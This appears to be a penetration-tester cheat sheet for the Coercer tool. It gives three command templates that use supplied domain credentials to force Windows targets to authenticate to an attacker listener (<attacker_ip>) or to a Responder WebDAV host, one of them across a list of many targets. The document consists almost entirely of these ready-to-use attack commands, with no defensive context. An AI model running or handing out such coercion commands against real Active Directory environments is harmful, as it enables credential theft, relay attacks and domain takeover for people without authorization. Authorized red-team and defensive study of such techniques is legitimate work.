# coercer

% adcs, certificate, windows, Active directory, template

## coercer - list vulns
#plateform/linux #target/remote #cat/RECON
```
coercer.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --listener <attacker_ip> <target_ip> 
```

## coercer - Webdav
#plateform/linux #target/remote #cat/RECON
```
coercer.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --webdav-host '<ResponderMachineName>' <target_ip> 
```

## coercer - List vulns many targets
#plateform/linux #target/remote #cat/RECON
```
coercer.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --listener <attacker_ip> --targets-file <PathToTargetFile> 
```